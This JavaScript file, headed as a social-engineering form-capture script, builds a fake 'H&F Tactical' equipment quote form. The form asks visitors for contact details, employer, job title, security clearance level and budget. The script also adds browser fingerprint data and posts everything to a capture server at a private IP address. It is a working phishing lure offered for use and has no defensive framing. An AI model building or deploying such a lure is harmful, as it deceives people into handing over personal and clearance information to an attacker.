// H&F Tactical - Form Data Capture for Social Engineering
// Captures user information and sends to backend

class FormCapture {
    constructor() {
        console.log('🎯 FormCapture initializing...');
        this.captureEndpoint = 'http://192.168.50.102:8081';
        this.initializeForms();
        console.log('✅ FormCapture initialized successfully');
    }

    initializeForms() {
        // Create quote form modal
        this.createQuoteModal();
        
        // Bind form submission events
        this.bindFormEvents();
        
        // Track user interactions
        this.trackUserBehavior();
    }

    createQuoteModal() {
        // Check if modal already exists
        if (document.getElementById('quoteModal')) {
            console.log('🎯 Quote modal already exists, skipping creation');
            return;
        }

        const modalHTML = `
            <div id="quoteModal" class="modal">
                <div class="modal-content single-form">
                    <div class="modal-header">
                        <h2><i class="fas fa-shield-alt"></i> Request Tactical Equipment Quote</h2>
                        <span class="close" onclick="closeQuoteModal()">&times;</span>
                    </div>
                    <div class="modal-body scrollable-form">
                        <form id="quoteForm" class="quote-form single-page">

                            <!-- Contact Information Section -->
                            <div class="form-section">
                                <h3><i class="fas fa-user"></i> Contact Information</h3>
                                <div class="form-row">
                                    <div class="form-group">
                                        <label for="name">Full Name *</label>
                                        <input type="text" id="name" name="name" required placeholder="Enter your full name">
                                    </div>
                                    <div class="form-group">
                                        <label for="email">Email Address *</label>
                                        <input type="email" id="email" name="email" required placeholder="your.email@company.com">
                                    </div>
                                </div>
                                <div class="form-row">
                                    <div class="form-group">
                                        <label for="phone">Phone Number *</label>
                                        <input type="tel" id="phone" name="phone" required placeholder="(555) 123-4567">
                                    </div>
                                    <div class="form-group">
                                        <label for="company">Company/Organization *</label>
                                        <input type="text" id="company" name="company" required placeholder="Your organization name">
                                    </div>
                                </div>
                            </div>

                            <!-- Professional Information Section -->
                            <div class="form-section">
                                <h3><i class="fas fa-briefcase"></i> Professional Information</h3>
                                <div class="form-row">
                                    <div class="form-group">
                                        <label for="position">Position/Title *</label>
                                        <input type="text" id="position" name="position" required placeholder="e.g., Security Director, Operations Manager">
                                    </div>
                                    <div class="form-group">
                                        <label for="department">Department *</label>
                                        <select id="department" name="department" required>
                                            <option value="">Select Department</option>
                                            <option value="security">Security</option>
                                            <option value="law-enforcement">Law Enforcement</option>
                                            <option value="military">Military</option>
                                            <option value="private-security">Private Security</option>
                                            <option value="corporate">Corporate Security</option>
                                            <option value="government">Government</option>
                                            <option value="other">Other</option>
                                        </select>
                                    </div>
                                </div>
                                <div class="form-row">
                                    <div class="form-group">
                                        <label for="clearance">Security Clearance Level</label>
                                        <select id="clearance" name="clearance">
                                            <option value="">Select Clearance</option>
                                            <option value="none">No Clearance Required</option>
                                            <option value="confidential">Confidential</option>
                                            <option value="secret">Secret</option>
                                            <option value="top-secret">Top Secret</option>
                                            <option value="ts-sci">TS/SCI</option>
                                        </select>
                                    </div>
                                    <div class="form-group">
                                        <label for="years_experience">Years of Experience</label>
                                        <select id="years_experience" name="years_experience">
                                            <option value="">Select Experience</option>
                                            <option value="0-2">0-2 years</option>
                                            <option value="3-5">3-5 years</option>
                                            <option value="6-10">6-10 years</option>
                                            <option value="11-15">11-15 years</option>
                                            <option value="16+">16+ years</option>
                                        </select>
                                    </div>
                                </div>
                            </div>

                            <!-- Equipment Requirements Section -->
                            <div class="form-section">
                                <h3><i class="fas fa-shield-alt"></i> Equipment Requirements</h3>
                                <div class="form-row">
                                    <div class="form-group">
                                        <label for="product_type">Product Category *</label>
                                        <select id="product_type" name="product_type" required>
                                            <option value="">Select Category</option>
                                            <option value="weapons">Tactical Weapons</option>
                                            <option value="defense-gear">Defense Equipment</option>
                                            <option value="emp-systems">EMP Systems</option>
                                            <option value="non-lethal">Non-Lethal Systems</option>
                                            <option value="surveillance">Surveillance Equipment</option>
                                            <option value="communication">Communication Systems</option>
                                            <option value="multiple">Multiple Categories</option>
                                        </select>
                                    </div>
                                    <div class="form-group">
                                        <label for="quantity">Estimated Quantity *</label>
                                        <select id="quantity" name="quantity" required>
                                            <option value="">Select Quantity</option>
                                            <option value="1-5">1-5 units</option>
                                            <option value="6-20">6-20 units</option>
                                            <option value="21-50">21-50 units</option>
                                            <option value="51-100">51-100 units</option>
                                            <option value="100+">100+ units</option>
                                        </select>
                                    </div>
                                </div>
                                <div class="form-row">
                                    <div class="form-group">
                                        <label for="budget">Budget Range *</label>
                                        <select id="budget" name="budget" required>
                                            <option value="">Select Budget</option>
                                            <option value="under-10k">Under $10,000</option>
                                            <option value="10k-50k">$10,000 - $50,000</option>
                                            <option value="50k-100k">$50,000 - $100,000</option>
                                            <option value="100k-500k">$100,000 - $500,000</option>
                                            <option value="500k+">$500,000+</option>
                                        </select>
                                    </div>
                                    <div class="form-group">
                                        <label for="timeline">Required Timeline *</label>
                                        <select id="timeline" name="timeline" required>
                                            <option value="">Select Timeline</option>
                                            <option value="immediate">Immediate (1-2 weeks)</option>
                                            <option value="short">Short-term (1 month)</option>
                                            <option value="medium">Medium-term (2-3 months)</option>
                                            <option value="long">Long-term (6+ months)</option>
                                        </select>
                                    </div>
                                </div>
                            </div>

                            <!-- Additional Information Section -->
                            <div class="form-section">
                                <h3><i class="fas fa-info-circle"></i> Additional Information</h3>
                                <div class="form-group">
                                    <label for="message">Specific Requirements</label>
                                    <textarea id="message" name="message" rows="4" placeholder="Please describe your specific tactical equipment needs, operational requirements, or any special considerations..."></textarea>
                                </div>
                                <div class="form-row">
                                    <div class="form-group">
                                        <label for="intended_use">Intended Use</label>
                                        <select id="intended_use" name="intended_use">
                                            <option value="">Select Use Case</option>
                                            <option value="training">Training Exercises</option>
                                            <option value="operations">Active Operations</option>
                                            <option value="research">Research & Development</option>
                                            <option value="demonstration">Demonstration/Testing</option>
                                            <option value="other">Other</option>
                                        </select>
                                    </div>
                                    <div class="form-group">
                                        <label for="urgency">Urgency Level</label>
                                        <select id="urgency" name="urgency">
                                            <option value="">Select Urgency</option>
                                            <option value="low">Low Priority</option>
                                            <option value="medium">Medium Priority</option>
                                            <option value="high">High Priority</option>
                                            <option value="critical">Critical/Emergency</option>
                                        </select>
                                    </div>
                                </div>
                            </div>

                            <!-- Submit Section -->
                            <div class="form-actions">
                                <button type="submit" class="submit-btn">
                                    <i class="fas fa-paper-plane"></i> Submit Quote Request
                                </button>
                                <button type="button" class="cancel-btn" onclick="closeQuoteModal()">
                                    <i class="fas fa-times"></i> Cancel
                                </button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        `;

        document.body.insertAdjacentHTML('beforeend', modalHTML);
    }

    bindFormEvents() {
        // Form submission
        document.getElementById('quoteForm').addEventListener('submit', (e) => {
            e.preventDefault();
            this.submitForm(e.target);
        });

        // Modal close events
        document.querySelector('.close').addEventListener('click', closeQuoteModal);
        document.getElementById('quoteModal').addEventListener('click', (e) => {
            if (e.target.id === 'quoteModal') {
                closeQuoteModal();
            }
        });

        // Bind all "Request Quote" buttons
        document.addEventListener('click', (e) => {
            console.log('🖱️ Click detected on:', e.target.tagName, e.target.className, e.target.textContent?.substring(0, 30));

            if (e.target.classList.contains('weapon-btn') ||
                e.target.classList.contains('card-btn') ||
                e.target.textContent.includes('Request Quote')) {
                console.log('🎯 Quote button clicked! Opening modal...');
                e.preventDefault();
                this.openQuoteModal();
            }
        });
    }

    openQuoteModal() {
        document.getElementById('quoteModal').style.display = 'block';
        document.body.style.overflow = 'hidden';
        
        // Track modal open
        this.trackEvent('modal_opened', {
            timestamp: new Date().toISOString(),
            page: window.location.pathname
        });
    }

    async submitForm(form) {
        const formData = new FormData(form);
        const data = {};
        
        // Convert FormData to object
        for (let [key, value] of formData.entries()) {
            data[key] = value;
        }

        // Add additional tracking data
        data.page_visited = window.location.href;
        data.time_on_page = Date.now() - this.pageLoadTime;
        data.browser_info = navigator.userAgent;
        data.screen_resolution = `${screen.width}x${screen.height}`;
        data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

        try {
            // Show loading state
            const submitBtn = form.querySelector('.submit-btn');
            const originalText = submitBtn.innerHTML;
            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Submitting...';
            submitBtn.disabled = true;

            // Debug logging
            console.log('🎯 Submitting to:', this.captureEndpoint);
            console.log('📋 Form data:', data);

            // Submit to capture server
            const response = await fetch(this.captureEndpoint, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: new URLSearchParams(data)
            });

            console.log('📡 Response status:', response.status);
            console.log('📡 Response headers:', response.headers);

            const result = await response.json();
            console.log('📄 Response data:', result);

            if (result.status === 'success') {
                this.showSuccessMessage(result);
                form.reset();
                setTimeout(() => closeQuoteModal(), 3000);
            } else {
                throw new Error(result.message || 'Submission failed');
            }

        } catch (error) {
            console.error('❌ Form submission error:', error);
            console.error('❌ Error details:', error.message);
            console.error('❌ Error stack:', error.stack);

            // Reset button
            const submitBtn = form.querySelector('.submit-btn');
            submitBtn.innerHTML = originalText;
            submitBtn.disabled = false;

            this.showErrorMessage(error.message);
        }
    }

    showSuccessMessage(result) {
        const modalBody = document.querySelector('.modal-body');
        modalBody.innerHTML = `
            <div class="success-message">
                <i class="fas fa-check-circle"></i>
                <h3>Quote Request Submitted Successfully!</h3>
                <p>${result.message}</p>
                <p><strong>Reference ID:</strong> ${result.reference_id}</p>
                <p>Our tactical equipment specialists will contact you within 24 hours to discuss your requirements.</p>
                <button onclick="closeQuoteModal()" class="submit-btn">Close</button>
            </div>
        `;
    }

    showErrorMessage() {
        alert('There was an error submitting your request. Please try again or contact us directly.');
    }

    trackUserBehavior() {
        this.pageLoadTime = Date.now();
        
        // Track page interactions
        document.addEventListener('click', (e) => {
            this.trackEvent('click', {
                element: e.target.tagName,
                class: e.target.className,
                text: e.target.textContent?.substring(0, 50)
            });
        });
    }

    trackEvent(eventType, data) {
        // Store events for later analysis
        if (!window.userEvents) window.userEvents = [];
        window.userEvents.push({
            type: eventType,
            timestamp: new Date().toISOString(),
            data: data
        });
    }
}

// Global functions
function openQuoteModal() {
    document.getElementById('quoteModal').style.display = 'block';
    document.body.style.overflow = 'hidden';
}

function closeQuoteModal() {
    document.getElementById('quoteModal').style.display = 'none';
    document.body.style.overflow = 'auto';
}

// Initialize FormCapture (single instance only)
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
        if (!window.formCaptureInstance) {
            window.formCaptureInstance = new FormCapture();
        }
    });
} else {
    if (!window.formCaptureInstance) {
        window.formCaptureInstance = new FormCapture();
    }
}
